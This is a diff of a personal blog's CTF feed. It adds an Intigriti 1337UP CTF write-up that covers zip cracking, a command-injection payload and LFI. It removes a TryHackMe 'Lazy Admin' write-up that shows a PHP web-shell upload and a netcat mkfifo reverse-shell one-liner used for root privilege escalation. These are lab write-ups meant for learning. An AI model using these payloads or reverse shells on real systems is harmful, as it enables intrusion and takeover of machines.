@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/ctf/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2022-02-27T19:42:23+00:00</updated>
+  <updated>2022-03-12T16:06:52+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/ctf/feed.xml</id>
 
   
@@ -30,6 +30,167 @@
   
   
 
+  
+    <entry>
+      <title type="html">Intigriti 1337UP CTF 2022</title>
+      <link href="https://darrynbrownfield.co.uk/intigritictf" rel="alternate" type="text/html" title="Intigriti 1337UP CTF 2022" />
+      <published>2022-03-12T00:00:00+00:00</published>
+      <updated>2022-03-12T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/intigritictf</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/intigritictf">&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cover.gif&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;These are a few write ups from the 1337UP CTF hosted by [Intigriti]](https://www.intigriti.com). It was a 24 hour CTF so didn’t get as much time on it as I would have liked however it was still a lot of fun.&lt;/p&gt;
+
+&lt;h1 id=&quot;mirage---misc&quot;&gt;Mirage - Misc&lt;/h1&gt;
+
+&lt;p&gt;The link for the ‘Mirage’ challenge was https://mirage.ctf.intigriti.io/. There were no additional files with this challenge. Looking at the website was just a static page with no working links.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/mirage.png&quot; alt=&quot;mirage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I looked at /robots.txt and found a whole list of entries.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragerobots.png&quot; alt=&quot;miragerobots&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are a few entires that lead no where and a some are trolls, the important ones are:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Disallow: /wordlists.txt
+Disallow: /ok.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://mirage.ctf.intigriti.io/wordlists.txt&lt;/code&gt; to download the wordlist to my machine. On /ok.txt is some text which includes ‘/uncclzrny.wct’ with a hint of using ROT.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/mirageok.png&quot; alt=&quot;mirageok&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I went over to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; and used rot13 on the text. This provided the url ‘/happymeal.jpg’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cyberchefrot.png&quot; alt=&quot;cyberchefrot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This led to another page ‘HelpMeOut.txt’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragehelp.png&quot; alt=&quot;miragehelp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This page provides a link to a download. Again using wget I download the zip file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragedownload.png&quot; alt=&quot;miragedownload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The zip is password protected.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $unzip flag.zip 
+Archive:  flag.zip
+[flag.zip] flag.txt password: 
+   skipping: flag.txt                incorrect password
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used zip2john to create a hash.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $zip2john flag.zip &amp;gt; zip.john                                                                          
+ver 1.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=68, decmplen=56, crc=CC303849
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then use john to crack the hash with the word list downloaded earlier.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $john --wordlist=wordlists.txt zip.john 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Soeasypeasy214   (flag.zip/flag.txt)
+1g 0:00:00:00 DONE (2022-03-11 20:32) 100.0g/s 15500p/s 15500c/s 15500C/s ##this will help you later..violent
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+┌─[daz@parrotos]─[~/Documents/1337UPCTF/Mirage]
+└──╼ $unzip flag.zip 
+Archive:  flag.zip
+[flag.zip] flag.txt password: 
+ extracting: flag.txt                
+┌─[daz@parrotos]─[~/Documents/1337UPCTF/Mirage]
+└──╼ $cat flag.txt 
+1337UP{Wh4tAM3ss.txt.jpg.whyareyouputtingmethroughthis}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;traveler---web&quot;&gt;Traveler - Web&lt;/h1&gt;
+
+&lt;p&gt;The link for the ‘Traveler’ challenge was https://traveller.ctf.intigriti.io/. There were no additional files with this challenge. Looking at the link its a travel agent based website.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/traveler.png&quot; alt=&quot;traveler&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Poking around the website I found a section to check availability.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerinjection.png&quot; alt=&quot;travelerinjection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I sent the request to Burp and started fuzzing the pack name field.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerapi.png&quot; alt=&quot;travelerapi&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When submitting &lt;code class=&quot;highlighter-rouge&quot;&gt;Single'&lt;/code&gt;  an error was generated showing&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;An error occurred whilst executing: bash check.sh Couple’&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelererror.png&quot; alt=&quot;travelererror&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It doesn’t appear to be verifying user input so I should be able to just append bash commands to the syntax so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;Single&amp;amp;ls&lt;/code&gt; because of the special character I URL encoded it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerls.png&quot; alt=&quot;travelerls&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It worked, so getting the flag was simple using the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;pack=Single%26%63%61%74%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67%2e%74%78%74&amp;amp;submit=Submit&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;cat ../../../flag.txt&lt;/code&gt; URL encoded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerflag.png&quot; alt=&quot;travelerflag&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;lovely-kitten-pictures-1---lovely-kitten-pictures&quot;&gt;Lovely Kitten Pictures 1 - Lovely Kitten Pictures&lt;/h1&gt;
+
+&lt;p&gt;The link for the ‘Lovely Kitten Pictures 1’ challenge was https://lovelykittenpictures.ctf.intigriti.io/. No files were included as part of this challenge. Navigating to the website just showed a picture of a cat with an option to switch.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cats.png&quot; alt=&quot;cats&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I sent the requests through Burp and saw a request to ‘/pictures.php?path=assets/1.jpg’. That looks it could be vulnerable to an LFI (Local File Inclusion).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/catsassets.png&quot; alt=&quot;catsassets&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I played around for a while trying the basics such as ../../../../flag.txt, ../../../../etc/passwd &amp;amp; etc but just got 404’s so decided to try ‘/pictures.php?path=pictures.php’ which if it worked would include the source code of the php file and I would be able to see how the request worked and it worked!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/catsflag.png&quot; alt=&quot;catsflag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Reading the code it looks like any file other than .jpg would return the contents of flag1.txt I look at the headers and the flag was included1.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;==========================================================================&lt;/p&gt;
+
+&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="intigriti" />
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Driver Write Up</title>
@@ -3233,224 +3394,6 @@ while True:
         <category term="ctf" />
       
         <category term="medium" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Lazy Admin Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/lazyadmin" rel="alternate" type="text/html" title="Lazy Admin Write Up" />
-      <published>2021-05-05T00:00:00+00:00</published>
-      <updated>2021-05-05T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/lazyadmin</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/lazyadmin">&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/lazyadmin&quot;&gt;lazyadmin&lt;/a&gt; is a fun easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22 BST
-Nmap scan report for 10.10.86.223
-Host is up (0.028s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
-|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
-|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - OpenSSH 7.2p2 Ubuntu&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;Opening the webpage just provides a default apache page, I checked the source code and tried robots.txt but didn’t find anything so ran a gobuster. Straight away I got a hit for ‘/content’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223 -t 75 -o gobuster.log
-===============================================================                                                                
-Gobuster v3.0.1                                                                                                                
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)                                                                
-===============================================================
-[+] Url:            http://10.10.86.223
-[+] Threads:        75
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/05/05 16:26:03 Starting gobuster
-===============================================================
-/content (Status: 301)
-[SNIP]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Navigating to ‘http://10.10.86.223/content’ appears to be another default page but this time revealing the server is running SweetRice CMS.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I ran a gobuster in the background while clicking around. I didnt find anything of interest, however gobuster found a few directories to review.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223/content/ -t 75 -o gobuster-sweetrice.log
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.86.223/content/
-[+] Threads:        75
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/05/05 16:33:33 Starting gobuster
-===============================================================
-/images (Status: 301)
-/js (Status: 301)
-/inc (Status: 301)
-/as (Status: 301)
-/_themes (Status: 301)
-/attachment (Status: 301)
-===============================================================
-2021/05/05 16:35:02 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;‘http://10.10.86.223/content/as’ took me to a login page, I tried some default credentials but couldnt log in. Looking around the folders ‘/inc/mysql_backup/’ looks interesting and in the folder is a single backup file.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/mysql.png&quot; alt=&quot;mysql&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The file is readable with cat, looking through I found a user account and password hash. Using the tool ‘hash-identifier’ the hash is md5. Because its md5 I used &lt;a href=&quot;https://crackstation.net&quot;&gt;crackstation&lt;/a&gt; rather than hashcat and got a hit.&lt;/p&gt;
-
-&lt;p&gt;Using the credentials from the mysql backup file and the cracked password I was able to login to ‘http://10.10.86.223/content/as’&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/sweetrice.png&quot; alt=&quot;sweetrice&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;Once logged in, I could clearly see the SweetRice version of 1.5.1, googling ‘sweetrice 1.5.1 exploit’ I found an &lt;a href=&quot;https://www.exploit-db.com/exploits/40716&quot;&gt;exploit&lt;/a&gt; using the upload feature. The exploit is just a simple python script doing a POST call to ‘/as/?type=media_center&amp;amp;mode=upload’.&lt;/p&gt;
-
-&lt;p&gt;Rather than use the exploit code I navigated to the ‘Media Center’ part of the website so I could upload a file.&lt;/p&gt;
-
-&lt;p&gt;I copied a php reverse shell from /usr/share/webshells/php from my ParrotOS and renamed to shell.php and updated the IP and port details.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;However, shell.php didn’t work, I didn’t get an error it just didn’t upload, I renamed to shell.php5 and tried to upload again and it worked. I clicked the uploaded file and got a shell.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [SNIP] from (UNKNOWN) [10.10.86.223] 38212
-Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
- 18:52:05 up 33 min,  0 users,  load average: 0.00, 0.00, 0.06
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;The first thing I checked was sudo -l and found the www-data was able to run a perl script as sudo with no password.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
-Matching Defaults entries for www-data on THM-Chal:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on THM-Chal:
-    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I checked the script permissions and I was not able to edit the script however I could read it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ ls -lah /home/itguy/backup.pl
--rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I stabilised my shell using python and started reviewing the script. It looks like the script calls another script so I again checked the permissions and I can edit this file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
-#!/usr/bin/perl
-
-system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);
-www-data@THM-Chal:/home/itguy$
-www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh
--rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
-www-data@THM-Chal:/home/itguy$
-www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.0.190 5554 &amp;gt;/tmp/f
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The /etc/copy.sh script has a nc reverse shell payload, I replaced the command with my own IP and port details  and ran the perl script as sudo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@THM-Chal:/home/itguy$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc IP 5555 &amp;gt;/tmp/f&quot; &amp;gt; /etc/copy.sh
-www-data@THM-Chal:/home/itguy$
-www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Root shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 5555
-listening on [any] 5555 ...
-connect to [SNIP] from (UNKNOWN) [10.10.86.223] 49536
-# id
-uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;
-
-&lt;p&gt;============================================================&lt;/p&gt;
-
-&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
       
 
       
